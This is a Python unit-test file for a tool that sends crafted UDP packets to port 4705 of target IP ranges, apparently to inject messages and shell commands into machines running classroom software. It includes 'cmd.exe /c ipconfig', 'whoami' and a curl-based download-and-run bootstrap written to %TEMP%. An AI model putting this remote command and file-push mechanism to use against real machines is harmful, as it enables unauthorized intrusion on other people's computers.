import io
import shutil
import socket
import unittest
import urllib.request
from contextlib import redirect_stdout
from pathlib import Path
from threading import Event
from types import SimpleNamespace
from unittest.mock import MagicMock, call, patch

from cli import main as core


class CoreTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.test_root = Path("build") / "test-core-temp"
        cls.test_root.mkdir(parents=True, exist_ok=True)
        cls.core = core
        cls.real_socket = socket.socket
        cls.network_guard = patch.object(
            socket, "socket",
            side_effect=AssertionError("测试期间禁止创建网络套接字"))
        cls.network_guard.start()

    @classmethod
    def tearDownClass(cls):
        cls.network_guard.stop()

    def message_text(self, packet):
        body = bytes(packet[self.core.MESSAGE_OFFSET:]).decode("utf-16le")
        return body.split("\x00", 1)[0]

    def command_text(self, packet):
        body = bytes(packet[self.core.COMMAND_OFFSET:]).decode("utf-16le")
        return body.split("\x00", 1)[0]

    def test_message_chunks(self):
        for text, parts in [
            ("a" * 448, 1),
            ("a" * 449, 2),
            ("中文" * 224, 1),
            ("中文" * 225, 2),
            ("😀" * 224, 1),
            ("😀" * 225, 2),
        ]:
            with self.subTest(text_length=len(text)):
                chunks = list(self.core.split_message(text))
                self.assertEqual(len(chunks), parts)
                self.assertEqual("".join(chunks), text)
                for chunk in chunks:
                    packet = self.core.pkg_sendlist("-msg", chunk)
                    self.assertEqual(len(packet), 954)
                    self.assertEqual(self.message_text(packet), chunk)

    def test_message_keeps_multiline_content(self):
        text = "第一行\n\n第二行\r\n😀\t结束\n" * 100
        chunks = list(self.core.split_message(text))
        self.assertGreater(len(chunks), 1)
        self.assertEqual("".join(chunks), text)

    def test_templates_are_not_mutated(self):
        message_template = self.core.basicCMD["-msg"].copy()
        command_template = self.core.basicCMD["-c"].copy()
        first = self.core.pkg_sendlist("-msg", "第一条")
        second = self.core.pkg_sendlist("-msg", "另一条")
        command = self.core.pkg_sendlist("-c", "cmd.exe /c ipconfig")
        self.assertIsNot(first, second)
        self.assertEqual(self.message_text(first), "第一条")
        self.assertEqual(self.message_text(second), "另一条")
        self.assertEqual(self.command_text(command), "cmd.exe /c ipconfig")
        self.assertEqual(self.core.basicCMD["-msg"], message_template)
        self.assertEqual(self.core.basicCMD["-c"], command_template)

    def test_capacity_errors_are_explicit(self):
        with self.assertRaises(ValueError):
            list(self.core.split_message("a\x00b"))
        with self.assertRaises(ValueError):
            self.core.pkg_sendlist("-msg", "a" * 449)
        command_units = self.core.COMMAND_MAX_BYTES // 2
        with self.assertRaises(ValueError):
            self.core.pkg_sendlist("-c", "a" * (command_units + 1))

    def test_ip_formats(self):
        self.assertEqual(self.core.get_ip("192.168.1.10"), ["192.168.1.10"])
        self.assertEqual(self.core.get_ip("192.168.1.1-3")[:3],
                         ["192.168.1.1", "192.168.1.2", "192.168.1.3"])
        network = self.core.get_ip("192.168.1.0/24")
        self.assertEqual(len(network), 254)
        self.assertEqual(network[0], "192.168.1.1")
        self.assertEqual(network[-1], "192.168.1.254")

    def test_options_validation(self):
        good = self.core.SendOptions("192.168.1.10", message="通知")
        self.core.validate_options(good)
        bad_cases = [
            self.core.SendOptions("", message="通知"),
            self.core.SendOptions("bad-address", message="通知"),
            self.core.SendOptions("192.168.1.10"),
            self.core.SendOptions("192.168.1.10", port=0, message="通知"),
            self.core.SendOptions("192.168.1.10", loops=0, message="通知"),
            self.core.SendOptions("192.168.1.10", interval=-1, message="通知"),
            self.core.SendOptions("192.168.1.10", message="通知", extra="nc"),
        ]
        for options in bad_cases:
            with self.subTest(options=options):
                with self.assertRaises(ValueError):
                    self.core.validate_options(options)

    def test_packet_preparation(self):
        options = self.core.SendOptions(
            "192.168.1.10", message="a" * 449, command="whoami")
        packets = self.core.prepare_packets(options)
        self.assertEqual(len(packets), 3)
        self.assertEqual(self.message_text(packets[0]) + self.message_text(packets[1]), "a" * 449)
        self.assertEqual(self.command_text(packets[2]), "whoami")

        options.extra = "s"
        packets = self.core.prepare_packets(options)
        self.assertIsNot(packets[-1], self.core.basicCMD["-s"])

    def test_invalid_reverse_range_is_rejected(self):
        for value in ["192.168.1.10-1", "192.168.1.0-10", "192.168.1.1-255"]:
            with self.subTest(value=value):
                with self.assertRaises(ValueError):
                    self.core.get_ip(value)

    def test_gui_send_uses_bytes_and_shared_transport(self):
        options = self.core.SendOptions("模拟目标", message="a" * 449,
                                       command="whoami", loops=2, interval=0)
        fake_socket = MagicMock()
        fake_socket.__enter__.return_value = fake_socket
        packets = [bytes(self.core.pkg_sendlist("-msg", chunk))
                   for chunk in self.core.split_message(options.message)]
        packets.append(bytes(self.core.pkg_sendlist("-c", options.command)))
        with patch.object(self.core, "get_ip", return_value=["模拟目标甲", "模拟目标乙"]):
            with patch.object(socket, "socket", return_value=fake_socket):
                count = self.core.execute_send(options)
        self.assertEqual(count, 12)
        self.assertEqual(fake_socket.sendto.call_args_list, [
            call(packet, (host, 4705))
            for _ in range(2) for host in ["模拟目标甲", "模拟目标乙"]
            for packet in packets])
        fake_socket.__exit__.assert_called_once()

    def test_cancellation_before_send_opens_no_socket(self):
        stopped = Event()
        stopped.set()
        options = self.core.SendOptions("模拟目标", message="通知", cancel_event=stopped)
        with patch.object(self.core, "get_ip", return_value=["模拟目标"]):
            with patch.object(socket, "socket") as factory:
                with self.assertRaisesRegex(RuntimeError, "操作已取消"):
                    self.core.execute_send(options)
                factory.assert_not_called()

    def test_cancellation_interrupts_long_interval(self):
        stopped = Event()
        options = self.core.SendOptions("模拟目标", message="通知",
                                       loops=2, interval=3600, cancel_event=stopped)
        fake_socket = MagicMock()
        fake_socket.__enter__.return_value = fake_socket

        def report(message):
            if "轮已发送" in message:
                stopped.set()

        with patch.object(self.core, "get_ip", return_value=["模拟目标"]):
            with patch.object(socket, "socket", return_value=fake_socket):
                with self.assertRaisesRegex(RuntimeError, "操作已取消"):
                    self.core.execute_send(options, report)
        fake_socket.sendto.assert_called_once()
        fake_socket.__exit__.assert_called_once()

    def test_send_error_closes_socket(self):
        fake_socket = MagicMock()
        fake_socket.__enter__.return_value = fake_socket
        fake_socket.sendto.side_effect = OSError("模拟发送失败")
        with patch.object(self.core, "get_ip", return_value=["模拟目标"]):
            with patch.object(socket, "socket", return_value=fake_socket):
                with self.assertRaisesRegex(OSError, "模拟发送失败"):
                    self.core.send([[1, 2, 3]], "模拟目标")
        fake_socket.__exit__.assert_called_once()

    def test_local_ports_match_exact_pids_and_wildcard_addresses(self):
        tasks = SimpleNamespace(returncode=0, stderr="", stdout=
                                '"StudentMain.exe","123"\n"other.exe","5123"\n')
        ports = SimpleNamespace(returncode=0, stderr="", stdout=
                                "UDP 0.0.0.0:4705 *:* 123\n"
                                "UDP [::]:4705 *:* 123\n"
                                "UDP 0.0.0.0:9999 *:* 5123\n")
        with patch.object(self.core, "_windows_command", side_effect=[tasks, ports]):
            with patch.object(socket, "gethostbyname", return_value="模拟本机"):
                ip, result = self.core.local_ip_and_ports()
        self.assertEqual(ip, "模拟本机")
        self.assertEqual(result, ["4705"])

    def test_windows_output_decoding_supports_utf8_and_gbk(self):
        self.assertEqual(self.core._decode_windows_output("规则已更新".encode("utf-8")), "规则已更新")
        self.assertEqual(self.core._decode_windows_output("服务已在运行".encode("gbk")), "服务已在运行")

    def test_firewall_running_service_exit_code_is_reported_as_success(self):
        responses = [
            SimpleNamespace(returncode=2, stdout="", stderr="请求的服务已经启动。"),
            SimpleNamespace(returncode=0, stdout="确定。", stderr=""),
            SimpleNamespace(returncode=0, stdout="已更新 6 规则。", stderr=""),
        ]
        with patch.object(self.core, "_windows_command", side_effect=responses) as command:
            results = self.core.set_firewall_rule("block")
        self.assertEqual(command.call_count, 3)
        self.assertEqual(results[0]["command"], "net.exe start MpsSvc")
        self.assertTrue(results[0]["success"])
        self.assertIn("原本已在运行", results[0]["stdout"])
        self.assertTrue(results[1]["success"])
        self.assertTrue(results[2]["success"])

    def test_file_transfer_validation(self):
        directory = self.test_root / "validation"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "测试 文件.txt"
            source.write_bytes(b"hello")
            result = self.core.validate_file_transfer("192.168.1.10", 4705, str(source))
            self.assertEqual(result, source.resolve())
            self.assertEqual(
                self.core.validate_file_transfer("192.168.1.1-2", 4705, str(source)),
                source.resolve())
            self.assertEqual(
                self.core.validate_file_transfer("192.168.1.0/24", 4705, str(source)),
                source.resolve())
            with self.assertRaisesRegex(ValueError, "IP 格式错误"):
                self.core.validate_file_transfer("192.168.1.10-1", 4705, str(source))
            with self.assertRaisesRegex(ValueError, "文件不存在"):
                self.core.validate_file_transfer("192.168.1.10", 4705, str(source) + ".missing")
            with self.assertRaisesRegex(ValueError, "文件"):
                self.core.validate_file_transfer("192.168.1.10", 4705, str(directory))
            with self.assertRaisesRegex(ValueError, "端口"):
                self.core.validate_file_transfer("192.168.1.10", 0, str(source))
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_supports_multiple_targets(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "multi-target"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            payload = b"multi-mode-payload"
            source.write_bytes(payload)
            reported = []
            sent_hosts = []

            def fake_send(packets, target, port, loops, interval,
                          report=None, cancel_event=None):
                sent_hosts.append(target)
                command = bytes(
                    packets[0][self.core.COMMAND_OFFSET:]).decode(
                        "utf-16le").split("\x00", 1)[0]
                bootstrap_url = command.split('-o "%TEMP%\\jyt.cmd" "', 1)[1].split('"', 1)[0]
                with urllib.request.urlopen(bootstrap_url, timeout=5) as response:
                    script = response.read().decode("utf-8-sig")
                file_url = script.split(
                    'curl.exe -fsSL --noproxy "*" --retry 2 -o "%PART%" "', 1)[1].split('"', 1)[0]
                with urllib.request.urlopen(file_url, timeout=5) as response:
                    self.assertEqual(response.read(), payload)
                return 1

            with patch.object(self.core, "send", side_effect=fake_send):
                result = self.core.transfer_file(
                    "192.168.1.1-3", 4705, str(source), listen_ip="127.0.0.1",
                    timeout=5, report=reported.append)
            self.assertEqual(sent_hosts, ["192.168.1.1", "192.168.1.2", "192.168.1.3"])
            self.assertEqual(result["targets"], sent_hosts)
            self.assertEqual(result["transferred"], sent_hosts)
            self.assertIsNone(result["port"])
            self.assertTrue(any("全部 3 个目标" in message for message in reported))
            self.assertTrue(any("目标 2/3（192.168.1.2）" in message for message in reported))
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_continues_after_one_target_fails(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "multi-failure"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            source.write_bytes(b"partial-payload")
            requested = []

            def fake_send(packets, target, port, loops, interval,
                          report=None, cancel_event=None):
                if target.endswith(".1"):
                    return 1
                requested.append(target)
                command = bytes(
                    packets[0][self.core.COMMAND_OFFSET:]).decode(
                        "utf-16le").split("\x00", 1)[0]
                bootstrap_url = command.split('-o "%TEMP%\\jyt.cmd" "', 1)[1].split('"', 1)[0]
                with urllib.request.urlopen(bootstrap_url, timeout=5) as response:
                    script = response.read().decode("utf-8-sig")
                file_url = script.split(
                    'curl.exe -fsSL --noproxy "*" --retry 2 -o "%PART%" "', 1)[1].split('"', 1)[0]
                with urllib.request.urlopen(file_url, timeout=5) as response:
                    self.assertEqual(response.read(), b"partial-payload")
                return 1

            with patch.object(self.core, "send", side_effect=fake_send):
                with self.assertRaisesRegex(RuntimeError, "完成 1/2 个目标") as failure:
                    self.core.transfer_file(
                        "192.168.1.1-2", 4705, str(source), listen_ip="127.0.0.1",
                        timeout=0.2, attempts=1, retry_delay=0)
            self.assertIn("192.168.1.1", str(failure.exception))
            self.assertEqual(requested, ["192.168.1.2"])
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_cli_reports_multiple_targets(self):
        result = {
            "name": "report.pdf",
            "size": 10,
            "target": "192.168.1.1-2",
            "targets": ["192.168.1.1", "192.168.1.2"],
            "transferred": ["192.168.1.1", "192.168.1.2"],
            "listen_ip": "192.168.1.20",
            "port": None,
        }
        arguments = SimpleNamespace(
            ip="192.168.1.1-2", p=4705, file="report.pdf",
            file_ip=None, file_timeout=120)
        buffer = io.StringIO()
        with patch.object(self.core, "transfer_file", return_value=result):
            with redirect_stdout(buffer):
                self.assertEqual(self.core.run_file_transfer(arguments), 0)
        self.assertIn("2 个目标桌面", buffer.getvalue())

    def test_file_transfer_command_and_bootstrap_script(self):
        command = self.core.build_transfer_command("http://192.168.1.10:54321/b/token")
        self.assertIn("cmd /c curl ", command)
        self.assertNotIn("powershell", command.lower())
        self.assertIn("http://192.168.1.10:54321/b/token", command)
        self.assertLessEqual(len(command.encode("utf-16le")) // 2, self.core.COMMAND_MAX_BYTES // 2)
        with self.assertRaisesRegex(ValueError, "报文容量"):
            self.core.build_transfer_command("http://" + "a" * 400)
        script = self.core.build_bootstrap_script(
            "http://192.168.1.10:54321/f/token", "报告 100% O'Brien.txt", 12,
            desktop_dir=r"C:\Users\测试\Desktop")
        self.assertIn("curl.exe", script)
        self.assertIn("报告 100%% O'Brien.txt", script)
        self.assertIn('set "DESKTOP=C:\\Users\\测试\\Desktop"', script)
        self.assertIn('"%%~zA"=="12"', script)
        self.assertNotIn("powershell", script.lower())

    def test_local_ip_detection_prefers_target_route(self):
        first = MagicMock()
        first.__enter__.return_value = first
        first.getsockname.return_value = ("10.0.0.20", 50000)
        with patch.object(socket, "socket", return_value=first):
            self.assertEqual(self.core.detect_local_ip("10.0.0.8"), "10.0.0.20")
        self.assertEqual(first.connect.call_args.args[0], ("10.0.0.8", 9))

    def test_local_ip_detection_ignores_tun_route_source(self):
        tun = MagicMock()
        tun.__enter__.return_value = tun
        tun.getsockname.return_value = ("198.18.0.0", 50000)
        with patch.object(socket, "socket", return_value=tun), \
                patch.object(socket, "getaddrinfo", return_value=[
                    (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("198.18.0.0", 0)),
                    (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.49.151.27", 0)),
                    (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("172.22.16.1", 0)),
                ]):
            self.assertEqual(self.core.detect_local_ip("10.49.131.30"), "10.49.151.27")
        self.assertFalse(self.core._is_usable_local_address("198.18.0.0"))
        self.assertFalse(self.core._is_usable_local_address("127.0.0.1", "192.168.1.10"))
        self.assertTrue(self.core._is_usable_local_address("127.0.0.1", "127.0.0.1"))

    def test_file_transfer_retries_udp_command_until_target_requests_file(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "retry"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            source.write_bytes(b"retry-payload")
            sends = []
            server_holder = []

            def fake_send(packets, target, port, loops, interval, report=None, cancel_event=None):
                sends.append((target, port))
                if len(sends) == 2:
                    server = server_holder[0]
                    with urllib.request.urlopen(server.file_url("127.0.0.1"), timeout=5) as response:
                        self.assertEqual(response.read(), b"retry-payload")
                return 1

            original_init = self.core.FileTransferServer.__init__

            def capture_server(server, *args, **kwargs):
                original_init(server, *args, **kwargs)
                server_holder.append(server)

            with patch.object(self.core, "send", side_effect=fake_send), \
                    patch.object(self.core.FileTransferServer, "__init__", capture_server):
                self.core.transfer_file(
                    "192.168.1.10", 4705, str(source), listen_ip="127.0.0.1",
                    timeout=5, attempts=3, retry_delay=0.01)
            self.assertEqual(len(sends), 2)
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_timeout_reports_connection_stage(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "timeout-stage"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            source.write_bytes(b"data")
            with patch.object(self.core, "send", return_value=1):
                with self.assertRaisesRegex(RuntimeError, "目标未访问文件服务.*发送端 IP"):
                    self.core.transfer_file(
                        "192.168.1.10", 4705, str(source), listen_ip="127.0.0.1",
                        timeout=0.2, attempts=1)
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_uses_http_server_and_sends_command(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "server"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            payload = b"file-payload" * 100
            source.write_bytes(payload)
            reported = []
            desktop = directory / "desktop"
            desktop.mkdir()
            sent = []

            def fake_send(packets, target, port, loops, interval, report=None, cancel_event=None):
                sent.append((packets, target, port, loops, interval))
                command = bytes(packets[0][self.core.COMMAND_OFFSET:]).decode("utf-16le").split("\x00", 1)[0]
                bootstrap_url = command.split('-o "%TEMP%\\jyt.cmd" "', 1)[1].split('"', 1)[0]
                with urllib.request.urlopen(bootstrap_url, timeout=5) as response:
                    script = response.read().decode("utf-8-sig")
                file_url = script.split('curl.exe -fsSL --noproxy "*" --retry 2 -o "%PART%" "', 1)[1].split('"', 1)[0]
                with urllib.request.urlopen(file_url, timeout=5) as response:
                    self.assertEqual(response.read(), payload)
                return 1

            with patch.object(self.core, "send", side_effect=fake_send):
                result = self.core.transfer_file(
                    "192.168.1.10", 4705, str(source), listen_ip="127.0.0.1",
                    timeout=5, report=reported.append, desktop_dir=str(desktop))
            self.assertEqual(result["name"], "payload.bin")
            self.assertEqual(result["size"], len(payload))
            self.assertEqual(sent[0][1:], ("192.168.1.10", 4705, 1, 0))
            self.assertTrue(any("下载文件" in message for message in reported))
            self.assertTrue(any("目标已下载文件" in message for message in reported))
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_timeout_and_cancellation(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "timeout"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            source.write_bytes(b"data")
            with patch.object(self.core, "send", return_value=1):
                with self.assertRaisesRegex(RuntimeError, "超时"):
                    self.core.transfer_file(
                        "192.168.1.10", 4705, str(source), listen_ip="127.0.0.1",
                        timeout=0.2)
                stopped = Event()
                stopped.set()
                with self.assertRaisesRegex(RuntimeError, "操作已取消"):
                    self.core.transfer_file(
                        "192.168.1.10", 4705, str(source), listen_ip="127.0.0.1",
                        timeout=1, cancel_event=stopped)
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_cli_parser_and_dispatch(self):
        parser = self.core.build_parser()
        args = parser.parse_args(["-ip", "192.168.1.10", "--file", "report.pdf",
                                  "--file-ip", "192.168.1.20", "--file-timeout", "30"])
        self.assertEqual(args.file, "report.pdf")
        self.assertEqual(args.file_ip, "192.168.1.20")
        self.assertEqual(args.file_timeout, 30)
        with self.assertRaises(SystemExit):
            parser.parse_args(["--file", "report.pdf", "-msg", "通知"])

    def test_send_cli_parser_keeps_existing_options(self):
        parser = self.core.build_parser()
        args = parser.parse_args([
            "-ip", "192.168.1.10", "-p", "4705", "-msg", "通知",
            "-l", "2", "-t", "3", "-e", "r"])
        self.assertEqual(args.msg, "通知")
        self.assertEqual(args.l, 2)
        self.assertEqual(args.e, "r")


if __name__ == "__main__":
    unittest.main()
